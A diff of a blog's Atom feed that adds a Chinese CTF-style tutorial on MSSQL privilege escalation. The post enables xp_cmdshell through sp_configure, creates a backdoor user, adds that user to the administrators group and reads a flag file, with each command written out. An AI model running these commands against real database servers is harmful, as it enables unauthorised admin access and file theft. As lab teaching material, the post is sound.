@@ -3,11 +3,79 @@
     <id>https://kiyomijin.github.io</id>
     <title>My Violet Eva Garden • Posts by &#34;数据库安全&#34; category</title>
     <link href="https://kiyomijin.github.io" />
-    <updated>2022-09-26T16:02:13.000Z</updated>
+    <updated>2022-09-27T14:46:06.000Z</updated>
     <category term="原创" />
     <category term="数据库安全" />
     <category term="CTF小训" />
     <category term="Misc" />
+    <entry>
+        <id>https://kiyomijin.github.io/2022/09/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/MSSQL%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB/</id>
+        <title>MSSQL提权攻击</title>
+        <link rel="alternate" href="https://kiyomijin.github.io/2022/09/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/MSSQL%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB/"/>
+        <content type="html">&lt;h1 id=&#34;sql-servermssql提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sql-servermssql提权&#34;&gt;#&lt;/a&gt; SQL Server（MSSQL）提权&lt;/h1&gt;
+&lt;p&gt;总结一下，下文使用有效命令全部为：&lt;/p&gt;
+&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;show advanced options&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;xp_cmdshell&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#master..xp_cmdshell的全写是master.dbo.xp_cmdshell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_cmdshell &lt;span class=&#34;string&#34;&gt;&amp;#x27;net user HeyJack HeyJack /add&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_cmdshell &lt;span class=&#34;string&#34;&gt;&amp;#x27;net localgroup administrators HeyJack /add&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_cmdshell &lt;span class=&#34;string&#34;&gt;&amp;#x27;ipconfig&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_cmdshell &lt;span class=&#34;string&#34;&gt;&amp;#x27;type C:\Documents and Settings\桌面\flag.txt&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;0x01-环境准备&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x01-环境准备&#34;&gt;#&lt;/a&gt; 0x01 环境准备&lt;/h2&gt;
+&lt;p&gt;输入用户名和密码，以 &lt;code&gt;sa&lt;/code&gt;  身份登录 SQL Server2005&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220927205858375.png&#34; alt=&#34;image-20220927205858375&#34;&gt;&lt;/p&gt;
+&lt;p&gt;登录后可以看到这样的界面&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220927210049933.png&#34; alt=&#34;image-20220927210049933&#34;&gt;&lt;/p&gt;
+&lt;p&gt;首先我们了解下什么是 sp_configure？&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220927210431221.png&#34; alt=&#34;image-20220927210431221&#34;&gt;&lt;/p&gt;
+&lt;p&gt;其中，在列出高级配置选项的例子中，官网显示了如何设置和列出所有配置选项：首先就是要设置 &lt;code&gt;show advanced options&lt;/code&gt;  为 &lt;code&gt;1&lt;/code&gt; ，可以显示高级选项。&lt;/p&gt;
+&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;USE master;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;GO  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;EXEC&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;show advanced options&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt;;  &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;sp_configure 的作用是显示或更改当前服务器的全局配置的高级选项，执行成功返回 0，失败返回 1，其中高级选项中包含 cmdshell 等。&lt;/p&gt;
+&lt;h2 id=&#34;0x02-提权攻击步骤&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x02-提权攻击步骤&#34;&gt;#&lt;/a&gt; 0x02 提权攻击步骤&lt;/h2&gt;
+&lt;h3 id=&#34;1第一步更改当前服务器的全局配置首选高级选项为1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1第一步更改当前服务器的全局配置首选高级选项为1&#34;&gt;#&lt;/a&gt; ①第一步，更改当前服务器的全局配置首选高级选项为 1&lt;/h3&gt;
+&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#以下大写字母均可小写&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;EXEC&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;show advanced options&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;RECONFIGURE;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220927211220768.png&#34; alt=&#34;image-20220927211220768&#34;&gt;&lt;/p&gt;
+&lt;p&gt;使用鼠标选中一行，然后右键选择执行&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220927211614093.png&#34; alt=&#34;image-20220927211614093&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;2第二步打开cmd-shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2第二步打开cmd-shell&#34;&gt;#&lt;/a&gt; ②第二步，打开 cmd-shell&lt;/h3&gt;
+&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;xp_cmdshell&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220927211736845.png&#34; alt=&#34;image-20220927211736845&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;3第三步输入你想执行的windows-cmd命令&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3第三步输入你想执行的windows-cmd命令&#34;&gt;#&lt;/a&gt; ③第三步，输入你想执行的 windows cmd 命令。&lt;/h3&gt;
+&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_cmdshell &lt;span class=&#34;string&#34;&gt;&amp;#x27;whoami&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220927211958154.png&#34; alt=&#34;image-20220927211958154&#34;&gt;&lt;/p&gt;
+&lt;p&gt;言归正传，我们为系统添加属于 &lt;code&gt;攻击者自己的net user账户&lt;/code&gt;  (主要目的是使用已知的用户名和密码)&lt;/p&gt;
+&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#比如，账户名是HeyJack 密码也是HeyJack&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_cmdshell &lt;span class=&#34;string&#34;&gt;&amp;#x27;net user HeyJack HeyJack /add&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220927212339481.png&#34; alt=&#34;image-20220927212339481&#34;&gt;&lt;/p&gt;
+&lt;p&gt;此时，我们在 windows 的 cmd 里，执行 net user&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;这一步是在服务器里面查看。当然，现在只是为了展示我们的创建结果。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;net user&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220927212609276.png&#34; alt=&#34;image-20220927212609276&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&amp;quot;开始&amp;quot; 菜单 — 管理工具 — 计算机管理 — 本地用户和组 — 用户 —HeyJack 右键属性 — 隶属于&lt;/p&gt;
+&lt;p&gt;查看当前分组在 Users 组&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220927212746484.png&#34; alt=&#34;image-20220927212746484&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;4第四步将你新建的用户移到administrators组&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4第四步将你新建的用户移到administrators组&#34;&gt;#&lt;/a&gt; ④第四步，将你新建的用户移到 administrators 组&lt;/h3&gt;
+&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_cmdshell &lt;span class=&#34;string&#34;&gt;&amp;#x27;net localgroup administrators HeyJack /add&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220927213122417.png&#34; alt=&#34;image-20220927213122417&#34;&gt;&lt;/p&gt;
+&lt;p&gt;继续查看我们的分组情况，可以看到，提权成功：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220927213219218.png&#34; alt=&#34;image-20220927213219218&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;5第五步获取远程服务器中的目标文件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5第五步获取远程服务器中的目标文件&#34;&gt;#&lt;/a&gt; ⑤第五步，获取远程服务器中的目标文件&lt;/h3&gt;
+&lt;p&gt;我们假设，服务器中管理员 Administrator 创建了一个 flag.txt 文件放在了桌面，我们的 &lt;code&gt;最终目的&lt;/code&gt; 就是&lt;strong&gt;为了获取它&lt;/strong&gt;。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220927221944235.png&#34; alt=&#34;image-20220927221944235&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;第一种方案3389远程连接&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#第一种方案3389远程连接&#34;&gt;#&lt;/a&gt; 第一种方案，3389 远程连接&lt;/h4&gt;
+&lt;p&gt;在 win+R 输入 &lt;code&gt;mstsc&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220927213803912.png&#34; alt=&#34;image-20220927213803912&#34;&gt;&lt;/p&gt;
+&lt;p&gt;查看服务器 ip 并在自己的客户端上连接，ip 地址也可以通过 SQL 提权命令 + “ipconfig” 来获取&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220927221540178.png&#34; alt=&#34;image-20220927221540178&#34;&gt;&lt;/p&gt;
+&lt;p&gt;然后 3389 远程连接&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220927213905588.png&#34; alt=&#34;image-20220927213905588&#34;&gt;&lt;/p&gt;
+&lt;p&gt;输入刚刚新建的用户民和密码&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220927214036680.png&#34; alt=&#34;image-20220927214036680&#34;&gt;&lt;/p&gt;
+&lt;p&gt;登录成功&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220927214149105.png&#34; alt=&#34;image-20220927214149105&#34;&gt;&lt;/p&gt;
+&lt;p&gt;然后打开 “我的电脑”— 进入 C 盘 — 找到 “Documents and Settings”— 选择 “Administrators”— 桌面 — 即可看到 flag.txt&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220927221815971.png&#34; alt=&#34;image-20220927221815971&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;第二种方案使用sql提权命令获取内容&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#第二种方案使用sql提权命令获取内容&#34;&gt;#&lt;/a&gt; 第二种方案，使用 SQL 提权命令获取内容&lt;/h4&gt;
+&lt;p&gt;另外，也可以使用 SQL 提权命令去当前管理员用户桌面查找（一般 flag 会放在桌面上）&lt;/p&gt;
+&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#dir命令查看当前路径&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_cmdshell &lt;span class=&#34;string&#34;&gt;&amp;#x27;dir&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#type命令查看文件内容，一般低版本中，windows桌面的路径为：C:\Documents &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; Settings\桌面\flag.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_cmdshell &lt;span class=&#34;string&#34;&gt;&amp;#x27;type C:\Documents and Settings\Administrator\桌面\flag.txt&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220927221113281.png&#34; alt=&#34;image-20220927221113281&#34;&gt;&lt;/p&gt;
+&lt;p&gt;至此，SQL Server 提权攻击演示完毕。&lt;/p&gt;
+</content>
+        <category term="数据库安全" />
+        <updated>2022-09-27T14:46:06.000Z</updated>
+    </entry>
     <entry>
         <id>https://kiyomijin.github.io/2022/09/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Redis%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB/</id>
         <title>Redis提权攻击</title>
